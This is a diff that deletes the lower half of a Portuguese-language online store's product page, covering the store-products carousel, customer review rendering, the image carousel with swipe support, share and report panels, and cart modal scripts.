-                    </div>
-                    <p class="text-sm text-gray-500" id="store-vendidos">- vendido(s)</p>
-                </div>
-            </div>
-            <button style="font-weight: 500; color: #000;" id="seguirBtn" class="bg-gray-100 text-gray-700 px-4 py-1 text-sm rounded hover:bg-gray-200 transition">
-                Seguir
-            </button>
-        </div>
-
-        <section class="max-w-6xl mx-auto px-4 py-6">
-            <h2 class="text-lg font-semibold mb-4">Mais desta loja</h2>
-
-            <div class="mais-desta-loja-carousel" id="mais-desta-loja-carousel">
-                <!-- Produtos serão inseridos dinamicamente aqui via JS. Fallback abaixo: -->
-                <noscript>
-                <!-- Produto 1 -->
-                <div class="mais-desta-loja-card">
-                    <div class="img-wrap">
-                        <img src="https://via.placeholder.com/150x150?text=Árvore" alt="Árvore de Natal">
-                    </div>
-                    <div class="valores">
-                        <p class="preco">R$ 29,90</p>
-                        <p class="desconto">-35%</p>
-                    </div>
-                </div>
-                <!-- Produto 2 -->
-                <div class="mais-desta-loja-card">
-                    <div class="img-wrap">
-                        <img src="https://via.placeholder.com/150x150?text=Luzes" alt="Pisca-pisca">
-                    </div>
-                    <div class="valores">
-                        <p class="preco">R$ 44,01</p>
-                        <p class="desconto">-37%</p>
-                    </div>
-                </div>
-                <!-- Produto 3 -->
-                <div class="mais-desta-loja-card">
-                    <div class="img-wrap">
-                        <img src="https://via.placeholder.com/150x150?text=Bolinhas" alt="Bolas de Natal">
-                    </div>
-                    <div class="valores">
-                        <p class="preco">R$ 19,00</p>
-                        <p class="desconto">-36%</p>
-                    </div>
-                </div>
-                <!-- Produto 4 -->
-                <div class="mais-desta-loja-card">
-                    <div class="img-wrap">
-                        <img src="https://via.placeholder.com/150x150?text=Papai+Noel" alt="Fantasia Papai Noel">
-                    </div>
-                    <div class="valores">
-                        <p class="preco">R$ 38,61</p>
-                        <p class="desconto">-35%</p>
-                    </div>
-                </div>
-                </noscript>
-            </div>
-        </section>
-        <script>
-        // Função para popular dinamicamente a seção "Mais desta loja" com produtos da vitrine
-        document.addEventListener('DOMContentLoaded', function () {
-            fetch('produtos.json')
-                .then(resp => resp.ok ? resp.json() : [])
-                .then(produtos => {
-                    if (!Array.isArray(produtos) || produtos.length === 0) return;
-                    // Tenta identificar o produto atual pelo parâmetro da URL
-                    function getUrlParam(name) {
-                        const url = new URL(window.location.href);
-                        return url.searchParams.get(name);
-                    }
-                    // Formata desconto para inteiro sem casas decimais (ex: 40.00 -> 40)
-                    function formatDesconto(val) {
-                        if (val === undefined || val === null) return null;
-                        let s = String(val).trim();
-                        s = s.replace('%', '').replace(',', '.');
-                        // remove sinais não-numéricos extras
-                        s = s.replace(/[^0-9.\-]/g, '');
-                        const n = parseFloat(s);
-                        if (isNaN(n)) return null;
-                        const r = Math.round(n); // arredonda para o inteiro mais próximo
-                        return String(Math.abs(r));
-                    }
-                    let produtoAtual = produtos[0];
-                    const paramId = getUrlParam('produto_id');
-                    if (paramId !== null) {
-                        const found = produtos.find(p => String(p.id) === String(paramId));
-                        if (found) produtoAtual = found;
-                    }
-                    // Filtra produtos da mesma vitrine (exemplo: mesmo campo "vitrine_id" ou similar)
-                    let vitrineId = produtoAtual.vitrine_id || produtoAtual.vitrine || null;
-                    let produtosVitrine = vitrineId
-                        ? produtos.filter(p => (p.vitrine_id || p.vitrine) == vitrineId && p.id != produtoAtual.id)
-                        : produtos.filter(p => p.id != produtoAtual.id);
-                    // Limita a 5 produtos
-                    produtosVitrine = produtosVitrine.slice(0, 5);
-                    const carousel = document.getElementById('mais-desta-loja-carousel');
-                    if (!carousel) return;
-                    carousel.innerHTML = '';
-                    if (produtosVitrine.length === 0) {
-                        carousel.innerHTML = '<div style="color:#888;font-size:14px;">Nenhum outro produto encontrado.</div>';
-                        return;
-                    }
-                    produtosVitrine.forEach(prod => {
-                        const card = document.createElement('div');
-                        card.className = 'mais-desta-loja-card';
-                        card.style.cursor = 'pointer';
-                        card.onclick = function() {
-                            window.location.href = 'produto.html?produto_id=' + encodeURIComponent(prod.id);
-                        };
-                        const descontoFmt = formatDesconto(prod.desconto);
-                        card.innerHTML = `
-                            <div class="img-wrap">
-                                <img src="${prod.fotos && prod.fotos[0] ? prod.fotos[0] : 'https://via.placeholder.com/150x150?text=Produto'}" alt="${prod.titulo || 'Produto'}">
-                            </div>
-                            <div class="valores">
-                                <p class="preco">R$ ${prod.preco || '--'}</p>
-                                ${descontoFmt !== null ? `<p class='desconto'>-${descontoFmt}%</p>` : ''}
-                            </div>
-                        `;
-                        carousel.appendChild(card);
-                    });
-                });
-        });
-        </script>
-
-        <script>
-            // Preencher o comentário em destaque com o primeiro comentário do backend
-            function preencherComentarioDestaque(produto) {
-                const el = document.getElementById('comentario-destaque');
-                if (!el) return;
-                if (produto.comentarios && produto.comentarios.length) {
-                    el.textContent = produto.comentarios[0].texto || 'Sem comentário.';
-                } else {
-                    el.textContent = 'Nenhum comentário disponível.';
-                }
-            }
-            // Renderizar avaliações dinâmicas do backend
-            function renderDynamicReviews(produto) {
-                const container = document.getElementById('dynamic-reviews');
-                if (!container) return;
-                container.innerHTML = '';
-                if (!produto.comentarios || !produto.comentarios.length) {
-                    container.innerHTML = '<div style="color:#888;font-size:14px;">Nenhuma avaliação ainda.</div>';
-                    return;
-                }
-                // Exibir todos os comentários, mais recentes primeiro
-                produto.comentarios.slice().reverse().forEach(comentario => {
-                    // Corrigir campo fotos: pode ser string JSON ou array
-                    let fotos = [];
-                    if (Array.isArray(comentario.fotos)) {
-                        fotos = comentario.fotos;
-                    } else if (typeof comentario.fotos === 'string') {
-                        try {
-                            fotos = JSON.parse(comentario.fotos);
-                        } catch (e) {
-                            fotos = [];
-                        }
-                    }
-                    const div = document.createElement('div');
-                    div.className = 'review-item';
-                    div.innerHTML = `
-            <div class="review-header">
-                <div class="review-avatar">
-                    <img alt="${comentario.nome || 'Usuário'}" src="${comentario.foto_perfil || 'images/perfil1.png'}" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;">
-                </div>
-                <div style="display: flex; flex-direction: column;">
-                    <span class="review-name">${comentario.nome || 'Usuário'}</span>
-                    <span style="color: #00d4aa; font-size: 11px; font-weight: 500;">${comentario.created_at || ''}</span>
-                </div>
-            </div>
-            <div class="review-stars">
-                ${'<svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L24 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>'.repeat(Math.round(comentario.nota || 5))}
-            </div>
-            <div class="review-variant">${comentario.variacao ? 'Item: ' + comentario.variacao : ''}</div>
-            <div class="review-text">${comentario.descricao || ''}</div>
-            <div class="review-images">
-                ${fotos.map((f, i) => `<div class="review-image"><img alt="Review photo ${i + 1}" src="${f}" onclick="openFullscreen('${f}', ${i})"></div>`).join('')}
-            </div>
-        `;
-                    container.appendChild(div);
-                });
-            }
-            // Utilitário para pegar parâmetro da URL
-            function getUrlParam(name) {
-                const url = new URL(window.location.href);
-                return url.searchParams.get(name);
-            }
-
-            // Carregar logo da loja dinamicamente de loja.json
-            fetch('loja.json')
-                .then(resp => resp.ok ? resp.json() : null)
-                .then(data => {
-                    // Corrige: se logo for null, undefined ou vazio, usa o default
-                    var logoUrl = 'images/belilogo.png';
-                    if (data && data.logo && typeof data.logo === 'string' && data.logo.trim() !== '') {
-                        const logoPath = data.logo.startsWith('http') ? data.logo : data.logo.replace(/^\/\/+/, '');
-                        logoUrl = logoPath.startsWith('http') ? logoPath : logoPath;
-                    }
-                    document.getElementById('store-logo').src = logoUrl;
-                    if (data && data.nome) {
-                        // Atualiza o nome da loja dinamicamente
-                        var nomeEl = document.getElementById('store-nome');
-                        if (nomeEl) nomeEl.textContent = data.nome;
-                    }
-                    // Buscar vendidos do backend (produtos.json)
-                    fetch('produtos.json')
-                        .then(resp => resp.ok ? resp.json() : null)
-                        .then(produtos => {
-                            if (Array.isArray(produtos)) {
-                                // Soma todos vendidos dos produtos
-                                const vendidos = produtos.reduce((acc, p) => acc + (parseInt(p.quantidade_produtos || p.vendidos || 0, 10)), 0);
-                                const vendidosEl = document.getElementById('store-vendidos');
-                                if (vendidosEl) vendidosEl.textContent = vendidos + ' vendido(s)';
-                                // Buscar produto pelo ID da URL
-                                let produto = produtos[0];
-                                const paramId = getUrlParam('produto_id');
-                                if (paramId !== null) {
-                                    const found = produtos.find(p => String(p.id) === String(paramId));
-                                    if (found) produto = found;
-                                }
-                                // Torna o produto selecionado global para o preview de variações
-                                window.produtoAtual = produto;
-                                // (promo visuals removidos nesta revisão)
-                                // Número de avaliações dinâmico do produto selecionado
-                                const reviewsCount = (typeof produto.avaliacoes === 'number') ? produto.avaliacoes : 207;
-                                const reviewsCountEl = document.getElementById('reviews-count');
-                                if (reviewsCountEl) reviewsCountEl.textContent = `Avaliações dos clientes (${reviewsCount})`;
-
-                                // Atualiza o número azul na avaliação do produto
-                                const ratingText = document.getElementById('rating-text');
-                                if (ratingText) {
-                                    ratingText.innerHTML = ratingText.innerHTML.replace(/\((\d+)\)/, '<span style="color:#2196f3;font-weight:700;">($1)</span>');
-                                }
-
-                                // Renderizar avaliações dinâmicas
-                                renderDynamicReviews(produto);
-                                // Preencher comentário destaque
-                                preencherComentarioDestaque(produto);
-
-                                // --- Lógica de carrossel de imagens ---
-                                setTimeout(function () {
-                                    const mainImg = document.getElementById('main-product-image');
-                                    const loadingEl = document.getElementById('image-loading');
-                                    const imageCounter = document.getElementById('image-counter');
-                                    const imageDots = document.getElementById('image-dots');
-                                    const imageThumbnails = document.getElementById('image-thumbnails');
-                                    const btnPrev = document.getElementById('img-prev-btn');
-                                    const btnNext = document.getElementById('img-next-btn');
-                                    const imageContainer = document.querySelector('.image-container');
-                                    let currentImgIdx = 0;
-
-                                    function showImage(idx) {
-                                        if (!produto.fotos || produto.fotos.length === 0) {
-                                            if (mainImg) {
-                                                mainImg.src = '';
-                                                mainImg.style.display = 'none';
-                                            }
-                                            if (loadingEl) loadingEl.textContent = 'Sem imagem';
-                                            if (imageCounter) imageCounter.textContent = '0/0';
-                                            if (imageDots) {
-                                                imageDots.innerHTML = '';
-                                            }
-                                            if (imageThumbnails) {
-                                                imageThumbnails.innerHTML = '';
-                                            }
-                                            return;
-                                        }
-                                        const targetIdx = ((idx % produto.fotos.length) + produto.fotos.length) % produto.fotos.length;
-                                        if (mainImg) {
-                                            const nextSrc = produto.fotos[targetIdx];
-                                            const prevIdx = currentImgIdx;
-                                            const direction = (targetIdx > prevIdx) ? 'forward' : (targetIdx < prevIdx ? 'backward' : 'none');
-                                            const hasCurrent = !!mainImg.getAttribute('src');
-                                            currentImgIdx = targetIdx;
-                                            // Pré-carrega próxima imagem para evitar piscada
-                                            const preload = new Image();
-                                            if (loadingEl) loadingEl.style.display = '';
-                                            preload.onload = function () {
-                                                if (loadingEl) loadingEl.style.display = 'none';
-                                                if (hasCurrent && direction !== 'none') {
-                                                    // remover camada anterior se existir
-                                                    const oldTemp = imageContainer.querySelector('.pmf-next-layer');
-                                                    if (oldTemp) oldTemp.remove();
-                                                    const temp = document.createElement('img');
-                                                    temp.className = 'pmf-next-layer';
-                                                    temp.alt = 'Imagem do Produto';
-                                                    temp.src = nextSrc; // já carregado
-                                                    temp.style.position = 'absolute';
-                                                    temp.style.inset = '0';
-                                                    temp.style.width = '100%';
-                                                    temp.style.height = '100%';
-                                                    temp.style.objectFit = 'cover';
-                                                    temp.style.willChange = 'transform';
-                                                    const dur = '.40s';
-                                                    temp.style.transition = 'transform ' + dur + ' cubic-bezier(.25,.8,.25,1)';
-                                                    // posição inicial fora
-                                                    temp.style.transform = (direction === 'forward') ? 'translateX(100%)' : 'translateX(-100%)';
-                                                    imageContainer.appendChild(temp);
-                                                    // preparar imagem atual
-                                                    mainImg.style.willChange = 'transform';
-                                                    mainImg.style.transition = 'transform ' + dur + ' cubic-bezier(.25,.8,.25,1)';
-                                                    mainImg.style.transform = 'translateX(0)';
-                                                    // dispara animação
-                                                    requestAnimationFrame(() => {
-                                                        temp.style.transform = 'translateX(0)';
-                                                        mainImg.style.transform = (direction === 'forward') ? 'translateX(-100%)' : 'translateX(100%)';
-                                                    });
-                                                    temp.addEventListener('transitionend', function (e) {
-                                                        if (e.propertyName === 'transform') {
-                                                            // finalizar troca
-                                                            mainImg.src = nextSrc;
-                                                            mainImg.style.transition = 'none';
-                                                            mainImg.style.transform = 'translateX(0)';
-                                                            temp.remove();
-                                                        }
-                                                    }, { once: true });
-                                                } else {
-                                                    // Primeiro load ou mesma imagem
-                                                    mainImg.style.transition = 'opacity .35s ease';
-                                                    mainImg.onload = null; // já pre-carregado
-                                                    mainImg.src = nextSrc;
-                                                    requestAnimationFrame(() => {
-                                                        mainImg.style.opacity = '1';
-                                                    });
-                                                }
-                                            };
-                                            preload.onerror = function () {
-                                                if (loadingEl) loadingEl.textContent = 'Erro ao carregar imagem';
-                                            };
-                                            preload.src = nextSrc;
-                                            if (!hasCurrent) {
-                                                // estado inicial: mostra imagem principal transparente até preload terminar
-                                                mainImg.style.display = '';
-                                                mainImg.style.opacity = '0';
-                                            }
-                                        }
-                                        if (imageCounter) imageCounter.textContent = (currentImgIdx + 1) + '/' + produto.fotos.length;
-                                        if (imageDots) {
-                                            imageDots.innerHTML = '';
-                                            for (let i = 0; i < produto.fotos.length; i++) {
-                                                const dot = document.createElement('span');
-                                                dot.style.display = 'inline-block';
-                                                dot.style.width = '8px';
-                                                dot.style.height = '8px';
-                                                dot.style.margin = '0 2px';
-                                                dot.style.borderRadius = '50%';
-                                                dot.style.background = i === currentImgIdx ? '#ff2d55' : '#ddd';
-                                                dot.style.cursor = 'pointer';
-                                                dot.addEventListener('click', () => showImage(i));
-                                                imageDots.appendChild(dot);
-                                            }
-                                        }
-                                        if (imageThumbnails) {
-                                            imageThumbnails.innerHTML = '';
-                                            for (let i = 0; i < produto.fotos.length; i++) {
-                                                const thumb = document.createElement('img');
-                                                thumb.src = produto.fotos[i];
-                                                thumb.alt = 'Miniatura ' + (i + 1);
-                                                thumb.style.width = '40px';
-                                                thumb.style.height = '40px';
-                                                thumb.style.objectFit = 'cover';
-                                                thumb.style.margin = '0 2px';
-                                                thumb.style.border = i === currentImgIdx ? '2px solid #ff2d55' : '1px solid #ededed';
-                                                thumb.style.borderRadius = '6px';
-                                                thumb.style.cursor = 'pointer';
-                                                thumb.addEventListener('click', () => showImage(i));
-                                                imageThumbnails.appendChild(thumb);
-                                            }
-                                        }
-                                    }
-                                    if (btnPrev) btnPrev.onclick = () => showImage(currentImgIdx - 1);
-                                    if (btnNext) btnNext.onclick = () => showImage(currentImgIdx + 1);
-                                    // --- Swipe/touch support ---
-                                    if (imageContainer) {
-                                        let touchStartX = 0;
-                                        let touchEndX = 0;
-                                        let touchMoved = false;
-                                        imageContainer.addEventListener('touchstart', function (e) {
-                                            if (e.touches.length === 1) {
-                                                touchStartX = e.touches[0].clientX;
-                                                touchMoved = false;
-                                            }
-                                        });
-                                        imageContainer.addEventListener('touchmove', function (e) {
-                                            if (e.touches.length === 1) {
-                                                touchEndX = e.touches[0].clientX;
-                                                touchMoved = true;
-                                            }
-                                        });
-                                        imageContainer.addEventListener('touchend', function (e) {
-                                            if (!touchMoved) return;
-                                            const deltaX = touchEndX - touchStartX;
-                                            if (Math.abs(deltaX) > 40) { // threshold for swipe
-                                                if (deltaX < 0) {
-                                                    // Swipe left: next image
-                                                    showImage(currentImgIdx + 1);
-                                                } else if (deltaX > 0) {
-                                                    // Swipe right: previous image
-                                                    showImage(currentImgIdx - 1);
-                                                }
-                                            }
-                                        });
-                                    }
-                                    // --- End swipe/touch support ---
-                                    showImage(0);
-                                }, 0);
-                                // --- Fim da lógica de carrossel ---
-                            }
-                        });
-                });
-
-            const seguirBtn = document.getElementById('seguirBtn');
-            seguirBtn.addEventListener('click', () => {
-                seguirBtn.textContent = 'Seguindo';
-            });
-        </script>
-
-
-        <section id="descricao-produto" style="padding: 16px;">
-            <h3 style="margin-top: 20px; margin-bottom: 12px; font-size: 16px; font-weight: 600;">Descrição do Produto
-            </h3>
-            <div id="descricao-produto-dinamica" style="white-space: pre-line; line-height: 1.7; font-size: 15px; color: #333; background: #fafbfc; border-radius: 10px; padding: 18px 16px; margin-bottom: 8px; box-shadow: 0 2px 8px #0001;">
-            </div>
-            <h3 style="margin-top: 20px; margin-bottom: 12px; font-size: 16px; font-weight: 600;">
-                Especificações
-                Técnicas</h3>
-            <div id="especificacoes-produto"></div>
-            <h3 style="margin-top: 20px; margin-bottom: 12px; font-size: 16px; font-weight: 600;">
-                Diferenciais</h3>
-            <div id="diferenciais-produto"></div>
-            <h3 style="margin-top: 20px; margin-bottom: 12px; font-size: 16px; font-weight: 600;">Garantia
-            </h3>
-            <div id="garantia-produto"></div>
-        </section>
-    </div>
-
-    <section id="recomendacoes" style="padding: 16px; margin-top: 20px;"></section>
-    <script src="js/recomendacoes.js"></script>
-
-    <!-- Modal de tela cheia para imagens -->
-    <div id="fullscreen-container" class="fullscreen-modal">
-        <span class="close-fullscreen" id="fullscreen-close">×</span>
-        <div class="fullscreen-content">
-            <img id="fullscreen-image" class="fullscreen-image" src="#" alt="Imagem em tela cheia">
-        </div>
-    </div>
-
-    <!-- Footer -->
-    <footer class="footer">
-
-
-    </footer>
-    <!-- Share Overlay -->
-    <div id="share-overlay" class="share-overlay" onclick="closeShareSection()"></div>
-
-            <!-- Override final para colar totalmente os cards da seção "Mais desta loja" -->
-            <style>
-                /* Ajuste: mais espaço entre cards e cantos levemente arredondados */
-                .mais-desta-loja-carousel {gap:6px!important; column-gap:6px!important;}
-                .mais-desta-loja-card {margin:0!important; padding:0!important; align-items: stretch !important;}
-                .mais-desta-loja-card + .mais-desta-loja-card {margin-left:0!important;}
-                .mais-desta-loja-card .img-wrap {margin:0!important; padding:0!important; border-radius:6px!important; overflow:hidden; background:#fff;}
-                .mais-desta-loja-card .img-wrap img {border-radius:0!important;}
-                /* Forçar valores no canto esquerdo e evitar centralização herdada */
-                .mais-desta-loja-card .valores {align-items:flex-start!important; align-self:flex-start!important; text-align:left!important; padding-left:2px!important;}
-                .mais-desta-loja-card .valores .preco,
-                .mais-desta-loja-card .valores .desconto {text-align:left!important; width:auto!important;}
-                /* Cores finais: preço preto, desconto rosa */
-                .mais-desta-loja-card .valores .preco { color:#000 !important; }
-                .mais-desta-loja-card .valores .desconto { color:#ff2d55 !important; }
-            </style>
-
-    <div id="share-section" class="share-section">
-        <div class="share-header">
-            <span class="share-title">Compartilhar</span>
-            <button class="share-close" onclick="closeShareSection()">×</button>
-        </div>
-        <div class="share-options">
-            <div class="share-option" onclick="copyLink(event)">
-                <div class="share-icon copy">
-                    <img src="images/link.png" alt="Copiar Link" style="width: 80%; height: 80%; object-fit: contain; display: block;">
-                </div>
-                <span class="share-label" id="copy-link-btn">Copiar Link</span>
-            </div>
-            <div class="share-option" onclick="copyLink()">
-                <div class="share-icon">
-                    <img src="images/whatsapp.png" alt="WhatsApp" style="width: 80%; height: 80%; object-fit: contain; display: block;">
-                </div>
-                <span class="share-label">WhatsApp</span>
-            </div>
-            <!-- [AQUI VEM O BASE64 DO INSTAGRAM - COPIE DO PRIMEIRO HTML] -->
-            <div class="share-option" onclick="copyLink()">
-                <div class="share-icon">
-                    <img src="images/instagram.png" alt="Instagram" style="width: 80%; height: 80%; object-fit: contain; display: block;">
-                </div>
-                <span class="share-label">Instagram Direct</span>
-            </div>
-            <!-- [AQUI VEM O BASE64 DO FACEBOOK - COPIE DO PRIMEIRO HTML] -->
-            <div class="share-option" onclick="copyLink()">
-                <div class="share-icon">
-                    <img src="images/facebook.png" alt="Facebook" style="width: 80%; height: 80%; object-fit: contain; display: block;">
-                </div>
-                <span class="share-label">Facebook</span>
-            </div>
-            <!-- [AQUI VEM O BASE64 DO TELEGRAM - COPIE DO PRIMEIRO HTML] -->
-            <div class="share-option" onclick="copyLink()">
-                <div class="share-icon">
-                    <img src="images/telegrama.png" alt="Telegram" style="width: 80%; height: 80%; object-fit: contain; display: block;">
-                </div>
-                <span class="share-label">Telegram</span>
-            </div>
-        </div>
-        <button class="share-cancel" onclick="closeShareSection()">Cancelar</button>
-    </div>
-
-    <!-- [AQUI VEM O COMPLAINT SECTION - COPIE DO PRIMEIRO HTML] -->
-    <div id="complaint-overlay" class="complaint-overlay" onclick="closeComplaintSection()"></div>
-
-    <div id="complaint-section" class="complaint-section">
-        <div class="share-options">
-            <button onclick="window.location.href='denuncia/index.html'" style="display: flex; gap: 5px; width: 100%;"><svg style=" font-weight: bold;" width="24px" height="24px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
-                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
-                    <g id="SVGRepo_iconCarrier">
-                        <rect width="24" height="24" fill="white"></rect>
-                        <g filter="url(#filter0_d_15_295)">
-                            <path d="M4.5 21V16M4.5 16V6.5C5.5 5.5 7 5 8.5 5C11.5 5 13.5 7.5 17.5 5.5V15.5C13.5 17.5 11.5 14.5 8.5 14.5C7.5 14.5 5.5 15 4.5 16Z" stroke="#000000" stroke-linecap="round" stroke-linejoin="round"></path>
-                        </g>
-                        <defs>
-                            <filter id="filter0_d_15_295" x="3" y="4.5" width="16" height="19" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
-                                <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
-                                <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha">
-                                </feColorMatrix>
-                                <feOffset dy="1"></feOffset>
-                                <feGaussianBlur stdDeviation="0.5"></feGaussianBlur>
-                                <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.1 0">
-                                </feColorMatrix>
-                                <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_15_295">
-                                </feBlend>
-                                <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_15_295" result="shape"></feBlend>
-                            </filter>
-                        </defs>
-                    </g>
-                </svg> Denunciar</button>
-        </div>
-    </div>
-    <button id="back-to-top" style="
-    display: none;
-    position: fixed;
-    bottom: 80px;
-    right: 20px;
-    width: 40px;  /* Diminuído de 50px para 40px */
-    height: 40px; /* Diminuído de 50px para 40px */
-    border-radius: 50%;
-    background: white;
-    border: 1px solid #e0e0e0;
-    box-shadow: 0 2px 8px rgba(0,0,0,0.1); /* Sombra mais suave */
-    cursor: pointer;
-    z-index: 999;
-    align-items: center;
-    justify-content: center;
-    font-size: 18px; 
-    transition: all 0.3s ease;
-">
-        <img src="images/carregar-seta-para-cima.png" alt="Voltar ao topo" width="24" height="24" style="display:block; transform: rotate(360deg); filter: drop-shadow(0 0 1px rgba(0,0,0,0.4));">
-    </button>
-
-    <!-- ...modal de carrinho removido... -->
-
-    <script src="js/all.min.js"></script>
-
-    <script src="js/script.js"></script>
-    <script src="js/cart.js"></script>
-    <script>
-        // Garante que o botão "Adicionar ao Carrinho" fora do modal NUNCA adiciona ao carrinho, só abre o modal
-        document.addEventListener('DOMContentLoaded', function () {
-            // Remove qualquer listener antigo e impede submit acidental
-            const btnAddCart = document.getElementById('add-to-cart-btn');
-            if (btnAddCart) {
-                btnAddCart.type = 'button';
-                btnAddCart.onclick = null;
-                btnAddCart.onmousedown = null;
-                btnAddCart.onmouseup = null;
-                btnAddCart.onkeypress = null;
-                btnAddCart.addEventListener('click', function (e) {
-                    e.preventDefault();
-                    e.stopImmediatePropagation();
-                    // Nunca adiciona ao carrinho aqui!
-                    fetch('produtos.json')
-                        .then(resp => resp.ok ? resp.json() : null)
-                        .then(produtos => {
-                            if (Array.isArray(produtos)) {
-                                let produto = produtos[0];
-                                const paramId = (new URL(window.location.href)).searchParams.get('produto_id');
-                                if (paramId !== null) {
-                                    const found = produtos.find(p => String(p.id) === String(paramId));
-                                    if (found) produto = found;
-                                }
-                                abrirModalProduto(produto);
-                            }
-                        });
-                    return false;
-                }, true);
-            }
-            // Botão "Comprar Agora" fora do modal também só abre o modal
-            const btnBuyNow = document.getElementById('buy-now-btn');
-            if (btnBuyNow) {
-                btnBuyNow.type = 'button';
-                btnBuyNow.onclick = null;
-                btnBuyNow.onmousedown = null;
-                btnBuyNow.onmouseup = null;
-                btnBuyNow.onkeypress = null;
-                btnBuyNow.addEventListener('click', function (e) {
-                    e.preventDefault();
-                    e.stopImmediatePropagation();
-                    fetch('produtos.json')
-                        .then(resp => resp.ok ? resp.json() : null)
-                        .then(produtos => {
-                            if (Array.isArray(produtos)) {
-                                let produto = produtos[0];
-                                const paramId = (new URL(window.location.href)).searchParams.get('produto_id');
-                                if (paramId !== null) {
-                                    const found = produtos.find(p => String(p.id) === String(paramId));
-                                    if (found) produto = found;
-                                }
-                                abrirModalProduto(produto);
-                            }
-                        });
-                    return false;
-                }, true);
-            }
-            // Remove qualquer submit de formulário na página
-            document.querySelectorAll('form').forEach(f => {
-                f.onsubmit = function (e) { e.preventDefault(); return false; };
-            });
-        });
-        // Removido wrapper duplicado de comprarAgora para evitar adição dupla ao carrinho
-    </script>
-    <!-- Lógica do modal de variações clonada do index.php -->
-    <script>
-        let produtoSelecionado = null;
-        let modalProdutoAtual = null;
-        // Guarda a posição de scroll para travar o fundo quando o modal abrir
-        let bodyScrollY = 0;
-
-
-        // Adiciona mini loading e animação ao abrir o modal do carrinho
-        function abrirModal() {
-            const modal = document.getElementById('meuModal');
-            if (!modal) return;
-            // Trava o scroll do fundo (compatível com iOS)
-            bodyScrollY = window.scrollY || window.pageYOffset || 0;
-            document.body.style.position = 'fixed';
-            document.body.style.top = `-${bodyScrollY}px`;
-            document.body.style.left = '0';
-            document.body.style.right = '0';
-            document.body.style.width = '100%';
-            document.body.style.overflow = 'hidden';
-            // Cria ou move o loading animado para a base do modal
-            let loadingOverlay = document.getElementById('cart-modal-loading');
-            const modalBox = modal.querySelector('.bg-white');
-            if (!loadingOverlay) {
-                loadingOverlay = document.createElement('div');
-                loadingOverlay.id = 'cart-modal-loading';
-                loadingOverlay.style.position = 'absolute';
-                loadingOverlay.style.left = '0';
-                loadingOverlay.style.right = '0';
-                loadingOverlay.style.bottom = '0';
-                loadingOverlay.style.height = '90px';
-                loadingOverlay.style.background = 'rgba(255,255,255,0.95)';
-                loadingOverlay.style.display = 'flex';
-                loadingOverlay.style.alignItems = 'center';
-                loadingOverlay.style.justifyContent = 'center';
-                loadingOverlay.style.zIndex = '10001';
-                loadingOverlay.innerHTML = `
-                                            <div style="display:flex;flex-direction:column;align-items:center;gap:0;">
-                                                <div class="dots-line" aria-label="Carregando" style="transform:scale(1.1)">
-                                                    <span class="dot dot-red"></span>
-                                                    <span class="dot dot-cyan"></span>
-                                                </div>
-                                            </div>
-                                        `;
-                if (modalBox) {
-                    modalBox.appendChild(loadingOverlay);
-                }
-            } else {
-                loadingOverlay.style.display = 'flex';
-            }
-            // Animação de "zoom in" do modal
-            modal.classList.remove('hidden');
-            if (modalBox) {
-                modalBox.style.transform = 'scale(0.85)';
-                modalBox.style.opacity = '0.7';
-                modalBox.style.transition = 'transform 0.28s cubic-bezier(.4,2,.6,1), opacity 0.28s';
-                setTimeout(() => {
-                    modalBox.style.transform = 'scale(1)';
-                    modalBox.style.opacity = '1';
-                }, 10);
-            }
-            // Remove o loading após um pequeno delay
-            setTimeout(() => {
-                if (loadingOverlay) loadingOverlay.style.display = 'none';
-            }, 650);
-        }
-
-        function fecharModal() {
-            const modalEl = document.getElementById('meuModal');
-            if (modalEl) modalEl.classList.add('hidden');
-            // Destrava o scroll do fundo e restaura posição
-            const top = document.body.style.top;
-            document.body.style.removeProperty('position');
-            document.body.style.removeProperty('top');
-            document.body.style.removeProperty('left');
-            document.body.style.removeProperty('right');
-            document.body.style.removeProperty('width');
-            document.body.style.removeProperty('overflow');
-            const y = top ? parseInt(top, 10) : 0;
-            window.scrollTo(0, (y && !Number.isNaN(y)) ? -y : (bodyScrollY || 0));
-            produtoSelecionado = null;
-            try { if (typeof _buyFloatCleanup === 'function') { _buyFloatCleanup(); _buyFloatCleanup = null; } } catch (e) { }
-        }
-
-        function showCenterToast(message, type = 'success', duration = 2000) {
-            const toast = document.createElement('div');
-            toast.className = 'toast-center';
-            const icons = {
-                success: `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="3" stroke="white"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>`,
-                error: `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="3" stroke="white"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>`,
-                info: `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="3" stroke="white"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m-1-4h.01M12 2a10 10 0 100 20 10 10 0 000-20z"/></svg>`
-            };
-            const iconEl = `<span class="toast-icon ${type}">${icons[type] || icons.info}</span>`;
-            toast.innerHTML = `${iconEl}<span class="toast-text">${message}</span>`;
-            document.body.appendChild(toast);
-            requestAnimationFrame(() => toast.classList.add('show'));
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => toast.remove(), 250);
-            }, duration);
-        }
-
-        // Utilitário: mantém o bloco de compra flutuando dentro do modal, acompanhando o scroll
-        let _buyFloatCleanup = null;
-        function setupFloatingBuyPosition() {
-            const modalBox = document.querySelector('#meuModal > .bg-white');
-            const floatBox = document.getElementById('modal-buy-floating');
-            if (!modalBox || !floatBox) return;
